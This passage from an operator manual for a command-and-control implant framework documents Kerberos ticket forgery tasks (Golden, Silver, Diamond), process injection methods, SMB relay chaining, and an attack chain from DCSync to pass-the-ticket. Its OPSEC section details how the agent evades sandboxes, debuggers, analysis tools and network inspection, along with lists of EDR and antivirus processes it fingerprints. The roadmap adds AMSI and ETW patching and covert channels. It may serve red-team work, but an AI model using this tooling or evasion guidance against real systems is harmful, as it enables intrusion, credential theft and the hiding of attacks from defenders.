| `dcsync` | — | `user` (target account, default `krbtgt`), `domain`, `dc`, `bind_user`, `bind_pass` | Verifies DCSync capability and retrieves target account LDAP attributes. |
| `golden-ticket` | `domain`, `sid`, `krbtgt_ntlm` | `username`, `user_id`, `lifetime_hours`, `groups` | Forges a Golden TGT offline. No DC contact. Pass output `ticket_b64` to `cred/ptt` to use it. |
| `silver-ticket` | `domain`, `sid`, `service_ntlm`, `target` | `service` (default `cifs`), `username`, `user_id`, `lifetime_hours`, `groups` | Forges a Silver TGS for a specific service. No DC contact. Pass output to `cred/ptt`. |
| `diamond-ticket` | `domain`, `sid`, `krbtgt_ntlm` | `groups`, `lifetime_hours`, `username` | Like a Golden Ticket but using the current user's real identity. Harder to detect than pure golden tickets. |

**Typical Kerberos attack chain:**

```
1. cred/dcsync        → confirm DCSync rights
2. cred/kerberoast    → get TGS hashes → crack → obtain account passwords
3. cred/opth ntlm=<hash> cmd="dir \\dc01\c$"  → get TGT + domain access
4. cred/golden-ticket → forge TGT for any user
5. cred/ptt           → inject forged ticket into session
```

---

### `inject` — Process Injection

| Method | Required args | Optional args | Notes |
|---|---|---|---|
| `classic` | `pid`, `shellcode` (base64) | — | VirtualAllocEx + WriteProcessMemory + CreateRemoteThread |
| `apc` | `target` (exe path), `shellcode` (base64) | — | Spawn suspended, queue APC to all threads, resume |
| `classic-spawn` | `target` (exe path), `shellcode` (base64) | — | Spawn new process + classic remote thread injection |
| `hollow` | `target` (exe path), `payload` (base64 PE) | — | Process hollowing — replaces image of suspended process |
| `hijack` | `pid`, `shellcode` (base64) | — | Suspend existing thread, redirect RIP, resume |
| `stomp` | `pid`, `shellcode` (base64) | — | Overwrite loaded DLL .text section. Requires `inject-stomp` feature flag at build time. |

---

### `relay_start` / `relay_stop` — SMB Relay Chain

Chain a downstream implant through this agent over a named pipe.

**relay_start args:**

| Field | Required | Default | Notes |
|---|---|---|---|
| `pipe` | yes | — | Named pipe name (e.g. `svcctl`) |
| `c2_host` | yes | — | Upstream C2 hostname or IP |
| `c2_port` | yes | — | Upstream C2 port |
| `reg_path` | no | `/r` | Agent registration path |
| `poll_path` | no | `/c` | Agent poll path |

**relay_stop:** No args. Stops the active relay.

---

## 7. Evidence & Artifacts

### Storage layout

MinIO hosts two buckets:

| Bucket | Path pattern | Contents |
|---|---|---|
| `artifacts` | `{build_id}.exe` | Compiled agent binaries |
| `evidence` | `{session_id}/{task_id}.bin` | Task output bytes |

### Accessing evidence

**MinIO web console:** `http://localhost:9001` — log in with the `DM_MINIO_ACCESS_KEY` / `DM_MINIO_SECRET_KEY` values from your `.env`. Browse the `evidence` bucket. Files are stored as binary blobs; download and inspect with the appropriate tool (text viewer, hex editor, etc.) depending on what the task captured.

**Presigned URLs:** The `evidence` table in PostgreSQL records a presigned URL for each piece of evidence. Query it directly:

```sql
SELECT session_id, task_id, url, captured_at
FROM evidence
ORDER BY captured_at DESC;
```

Connect with `psql`:
```
docker compose exec postgres psql -U dm -d dm
```

Presigned URLs are valid for 24 hours from generation. Re-generate with the MinIO SDK or console if expired.

**Direct download (MinIO S3 API):** With valid credentials:
```
curl -u "$DM_MINIO_ACCESS_KEY:$DM_MINIO_SECRET_KEY" \
  "http://localhost:9000/evidence/{session_id}/{task_id}.bin" \
  -o output.bin
```

### Exporting evidence for a campaign

To pull all evidence for a given campaign as a zip (no built-in export UI currently):

1. Query the `evidence` table for the campaign:
```sql
SELECT e.url, e.filename, t.type, t.args, s.hostname
FROM evidence e
JOIN sessions s ON s.id = e.session_id
JOIN tasks t ON t.id = e.task_id
WHERE e.campaign_id = '<CAMPAIGN_UUID>';
```

2. Use the MinIO console's "Select All → Download" functionality per session folder, or use `mc` (MinIO client):
```
mc alias set dm http://localhost:9000 "$DM_MINIO_ACCESS_KEY" "$DM_MINIO_SECRET_KEY"
mc cp --recursive dm/evidence/<session_id>/ ./export/
```

### Artifact downloads

Build artifact download URLs are presigned MinIO URLs with a 24-hour TTL. They are displayed in the Build page UI and returned by `GET /api/v1/builds/{id}` in the `artifact_url` field. After 24 hours the URL expires; re-generate by calling `GET /api/v1/builds/{id}` again (the server re-presigns on each request, though the underlying object persists until manually deleted from MinIO).

---

## 8. OPSEC Notes

### What the agent does to avoid detection

**Pre-flight checks (run once at startup, before any network contact):**

1. **Sandbox artifact detection:** Checks `USERNAME` and `COMPUTERNAME` environment variables against known sandbox strings: `sandbox`, `analyst`, `maltest`, `test`, `virus`, `av`, `malware` (username); `sandbox`, `analysis`, `virus`, `malware`, `cuckoo` (hostname). Case-insensitive substring match. If triggered: silently return from `main()`.

2. **Process count check:** Enumerates running processes via `CreateToolhelp32Snapshot`. If fewer than 30 processes are running, the environment is likely a sandbox or bare VM. If triggered: silently exit.

3. **System uptime check:** Uses `GetTickCount64`. If uptime is under 5 minutes, the machine was freshly booted — sandbox indicator. If triggered: silently exit.

**In-loop checks (run every poll cycle, after initial check-in):**

4. **Debugger detection:** Calls `IsDebuggerPresent()`. If a debugger is attached to the agent process: silently exit.

5. **Analysis tool detection:** Enumerates processes and checks for: `wireshark.exe`, `procmon.exe`, `procmon64.exe`, `processhacker.exe`, `x64dbg.exe`, `x32dbg.exe`, `ollydbg.exe`, `ida.exe`, `ida64.exe`, `idag.exe`, `idat.exe`, `autoruns.exe`, `autoruns64.exe`, `fiddler.exe`, `burpsuite.exe`, `dnspy.exe`, `dotpeek64.exe`. If any are found: silently exit, and report an `evasion_event` to the server on the next output submission (which may or may not succeed before exit).

**Network profile:**

- The HTTPS channel uses a legitimate Chrome user-agent string: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36`
- Agent registration and poll use generic paths `/r` and `/c` (configurable at build time via `DM_C2_PATH_POLL` / `DM_C2_PATH_REG`).
- TLS 1.3 minimum, configured on the C2 listener side.

**Binary profile:**

- No console window (`#![windows_subsystem = "windows"]`).
- Debug symbols stripped, code size-optimized, LTO enabled.
- No output on failure — all error paths silently return.
- ECDH key exchange on registration; session key material stays server-side.

### What NOT to do

**Do not run the agent in a sandbox or analysis VM.** The process count check will fire for VMs with <30 processes (common in snapshots and sandboxes). Use `DM_NO_EVASION=true` for testing only.

**Do not leave `DM_TLS_SKIP_VERIFY=true` in production builds.** This makes the agent accept any certificate, including a defender's MITM proxy.

**Do not use weak credentials in production.** Set strong values for all secrets in `.env` and run `dm-seed` to set the operator password before any external exposure.

**Do not run Wireshark or Process Hacker on the same machine as a live agent.** The in-loop analysis tool check will trigger and the agent will exit, raising an `EVASION_DETECTED` event visible in the campaign feed.

**Do not use the `sleep` task to set an interval of 0 or 1 second.** High-frequency polling creates distinctive network patterns. Minimum recommended interval for covert ops is 60 seconds with 20–30% jitter.

**Do not reuse build UUIDs.** Each build is assigned a unique UUID that ties sessions back to that specific binary. Reusing UUIDs breaks audit trails.

**Do not expose the operator UI (port 3000/8080) to the internet.** JWT tokens stored in localStorage are accessible to any script on the page. Restrict access to a VPN or allow-listed IP range.

**Do not point agents directly at the team server IP.** Use a redirector. If the redirector is burned (IP blocklisted, domain taken down), you replace the redirector and rebuild agents — the team server stays clean.

### EDR/AV fingerprint reporting

The agent enumerates running processes at registration time and populates `edr_detected` and `av_detected` arrays in the session fingerprint. This is informational only — the agent does not attempt to disable or evade detected security products in Phase 1. The session console's yellow warning bar surfaces this data.

Process lists checked:

**EDR:** CrowdStrike (`csagent.exe`, `csfalconservice.exe`), SentinelOne (`sentinelagent.exe`, `sentineld.exe`), Carbon Black (`cbagent.exe`, `cbtool.exe`), Cortex XDR (`cyserver.exe`, `cympprocess.exe`), Cylance (`cylancesvc.exe`), Defender ATP/MDE (`mssense.exe`, `sensecncproxy.exe`), Elastic (`elastic-agent.exe`, `elastic-endpoint.exe`), Tanium (`taniumclient.exe`).

**AV:** Windows Defender (`msmpeng.exe`, `mpcmdrun.exe`), Kaspersky (`avp.exe`, `ksde.exe`), BitDefender (`bdagent.exe`, `bdwtxag.exe`), ESET (`ekrn.exe`, `egui.exe`), Malwarebytes (`malwarebytes.exe`, `mbam.exe`), Avast (`avastsvc.exe`, `avastui.exe`), AVG (`avgsvc.exe`, `avgui.exe`), McAfee (`mcshield.exe`, `mfefire.exe`), Sophos (`savservice.exe`), Trend Micro (`tmbmsrv.exe`, `ntrtscan.exe`).

---

## 9. Troubleshooting

### Agent not checking in

**Symptom:** The session does not appear in the UI after deploying the agent.

1. **Evasion checks fired.** If running in a VM or sandbox environment, or with fewer than 30 processes, the agent exits silently before making any network contact. Test with `DM_NO_EVASION=true` built in.

2. **Uptime too short.** If the test machine was just booted (uptime < 5 minutes), the uptime check fires. Wait 5 minutes and retry, or build with `DM_NO_EVASION=true`.

3. **Sandbox artifact match.** If your test username or hostname contains `sandbox`, `analyst`, `maltest`, `test`, `virus`, `av`, or `malware`, the pre-flight check fires. Rename the test account.

4. **C2 host/port mismatch.** Confirm `DM_C2_HOST` and `DM_C2_PORT` match the accessible address of the C2 listener. From the target, test connectivity:
   ```
   Test-NetConnection -ComputerName <DM_C2_HOST> -Port <DM_C2_PORT>
   ```

5. **TLS certificate rejection.** Production builds have `DM_TLS_SKIP_VERIFY=false`. If the server's certificate is self-signed and the agent was built for production, the TLS handshake will fail silently. Either use a valid cert or rebuild with `DM_TLS_SKIP_VERIFY=true` for dev.

6. **Firewall blocking port 4443.** Verify outbound 4443/TCP is allowed from the target. The C2 listener port can be changed at build time via `DM_C2_PORT` if needed.

7. **Server container not healthy.** Check `docker compose ps` and `docker compose logs server`. The C2 listener starts after the HTTP gateway; look for the log line `C2 listener starting addr=:4443`.

### Session shows as dead (gray dot)

**Symptom:** The session exists but `is_alive = false`. The agent may still be running.

The server marks sessions stale when they miss `5 × sleep_seconds` without a heartbeat. At the default 30-second sleep, this is 2.5 minutes.

1. Confirm the agent process is still running on the target (`Get-Process dm-agent`).
2. If the process exists but is not checking in, it likely encountered an in-loop evasion check (analysis tool running, debugger attached). Check the campaign event feed for an `EVASION_DETECTED` event.
3. If the process is gone, the agent exited. Check Windows Event Log and any EDR telemetry for clues.

### Build fails

**Symptom:** Build status shows `failed`.

1. Check server logs for the Docker error:
   ```
   docker compose logs server | grep -i "build"
   ```

2. Common causes:
   - **Docker socket not mounted:** The server container requires `/var/run/docker.sock` mounted. Verify in `docker-compose.yml` — the `server` service has `- /var/run/docker.sock:/var/run/docker.sock`.
   - **Build volume name mismatch:** The artifacts volume name must match `${COMPOSE_PROJECT_NAME:-dungeonmaster}_build_artifacts`. Check `docker volume ls`.
   - **Workspace not mounted:** The Dockerfile for the agent is resolved from `/workspace/infra/docker/Dockerfile.agent`. The server has `- .:/workspace:ro` in its volumes.
   - **Network issues pulling Rust base image:** The builder uses `rust:1.86-alpine`. Ensure the host has internet access when the build runs for the first time to pull this image.

3. Re-run the build after fixing the issue. Each build attempt creates a new record.

### TLS errors in server logs

**Symptom:** `c2 listener error` in `docker compose logs server`.

1. Verify cert files exist and are readable:
   ```
   docker compose exec server ls -la /certs/
   ```
   Expected: `server.crt` and `server.key`.

2. Check that `certs/server.crt` and `certs/server.key` exist on the host (they are in the repository). If deleted, regenerate:
   ```
   openssl req -x509 -newkey rsa:4096 -keyout certs/server.key \
     -out certs/server.crt -days 3650 -nodes \
     -subj "/CN=dungeonmaster"
   ```
   Then restart: `docker compose restart server`.

### Session console timeout ("Timeout waiting for task output")

**Symptom:** The console prints the timeout message after 2 minutes with no output.

The UI polls every 2 seconds for 60 attempts (120 seconds total). If the agent is sleeping and hasn't polled yet within that window, the task is still in the `queued` state when the UI gives up.

- The task is NOT lost. Check the task status directly:
  ```
  curl -s http://localhost:8080/api/v1/sessions/<SESSION_ID>/tasks \
    -H 'Authorization: Bearer <TOKEN>' | jq '[.[] | {id, type, status}]'
  ```
- The task will be picked up and executed on the agent's next poll. Output will be stored in evidence even if the UI timed out.
- Reduce the agent's sleep interval for interactive operations: `PATCH /api/v1/sessions/{id}/sleep` with `sleep_seconds: 5`.

### MinIO upload failing (evidence not stored)

**Symptom:** Tasks complete but no evidence appears in the MinIO `evidence` bucket.

1. Check server logs: `docker compose logs server | grep -i "minio\|evidence"`.
2. Verify MinIO is healthy: `docker compose ps minio`.
3. If the `minio` container was not healthy when the `server` container started, MinIO initialization was skipped with a warning. Restart the server: `docker compose restart server`.
4. Verify bucket creation: log in to `http://localhost:9001` and confirm the `evidence` and `artifacts` buckets exist.

### JWT token expired

**Symptom:** API calls return 401. The UI shows a login redirect.

Access tokens expire (typically within minutes). The React app should refresh automatically using the stored refresh token. If this fails:
- Log out and log back in to get fresh tokens.
- If the server's `DM_JWT_SECRET` was rotated (e.g., `.env` was changed and the server restarted), all existing tokens are invalidated. All operators must log in again.

---

## 10. Roadmap

The following features are planned but not yet implemented. Stubs exist in the codebase where noted.

### Phase 2 — Operational hardening

| Feature | Notes |
|---|---|
| TOTP enforcement | Code exists in `gateway.go` and `dm-seed`; uncomment the validation block in `handleLogin`. Requires scanning the TOTP QR code from `dm-seed` output into an authenticator app. |
| TLS certificate pinning | Build the server cert's SHA256 into the agent at compile time; verify on each connection. |
| Encrypted C2 traffic | ECDH key exchange already implemented in `session.Manager` and `agent/src/crypto.rs`. Phase 1 uses plaintext JSON for simplicity; Phase 2 wraps payloads with AES-256-GCM using the derived session key. |
| Registration key | `DM_REG_KEY` build arg exists (currently a zero-filled placeholder). Phase 2 uses it to encrypt the registration payload so an unauthenticated server cannot register foreign agents. |

### Phase 3 — Post-exploitation modules

| Feature | Notes |
|---|---|
| BOF / PIC loader (`module` task) | Load and run Beacon Object Files or position-independent shellcode in-process. |
| Process injection (`inject` task) | Inject into a remote process. |
| Process hollowing | Cargo feature `process-hollow` — launch a legitimate process and replace its image. |
| ETW patching | Cargo feature `etw-patch` — suppress ETW telemetry in-process. |
| AMSI patching | Cargo feature `amsi-patch` — bypass AMSI in the current process. |

### Phase 4 — Covert channels

| Feature | Notes |
|---|---|
| DNS channel | Cargo feature `channel-dns` stub exists. DNS-over-HTTPS or raw DNS tunnel. |
| SMB named-pipe channel | Cargo feature `channel-smb` stub exists. For lateral movement without touching the network stack from compromised hosts. |

### Phase 5 — Intelligence layer

| Feature | Notes |
|---|---|
| MITRE ATT&CK tagging | `mitre_technique_id` field exists in tasks, evidence, and `ttp_mappings` table. The AI engine (`ai/engine/ttp_ranker.py`) is scaffolded. |
| Campaign timeline export | Export all events, tasks, and evidence for a campaign as a structured report. |
| Operator audit log | `audit_log` table exists in the schema; write logic not yet wired up. |
| Campaign scoping enforcement | Validate that session IPs fall within the campaign's `scope_cidrs` before allowing task dispatch. |
